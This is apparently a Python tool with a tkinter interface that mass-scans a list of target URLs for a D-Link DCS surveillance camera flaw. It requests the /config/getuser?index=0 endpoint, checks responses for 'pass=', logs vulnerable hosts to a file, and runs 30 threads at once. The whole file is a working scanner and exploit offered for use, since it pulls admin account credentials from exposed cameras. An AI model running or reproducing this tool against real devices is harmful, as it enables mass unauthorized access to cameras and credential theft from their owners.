import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def dcs_admin_passwd_leak_exp(url):
    poc = r"""/config/getuser?index=0"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3,allow_redirects=False)
        if "pass=" in res.text and res.status_code == 200:
            dcs_admin_passwd_leak_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            dcs_admin_passwd_leak_text.see(END)
            with open ("存在D-Link DCS系列监控 账号密码信息泄露漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            dcs_admin_passwd_leak_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            dcs_admin_passwd_leak_text.see(END)
    except Exception as err:
        dcs_admin_passwd_leak_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        dcs_admin_passwd_leak_text.see(END)
def get_dcs_admin_passwd_leak_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def dcs_admin_passwd_leak_gui():
    dcs_admin_passwd_leak = tk.Tk()
    dcs_admin_passwd_leak.geometry("910x450")
    dcs_admin_passwd_leak.title("D-Link DCS系列监控 账号密码信息泄露漏洞一把梭")
    dcs_admin_passwd_leak.resizable(0, 0)
    dcs_admin_passwd_leak.iconbitmap('logo.ico')
    global dcs_admin_passwd_leak_text
    dcs_admin_passwd_leak_text = scrolledtext.ScrolledText(dcs_admin_passwd_leak,width=123, height=25)
    dcs_admin_passwd_leak_text.grid(row=0, column=0, padx=10, pady=10)
    dcs_admin_passwd_leak_text.see(END)
    addrs = get_dcs_admin_passwd_leak_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(dcs_admin_passwd_leak_exp, addr)
    dcs_admin_passwd_leak.mainloop()
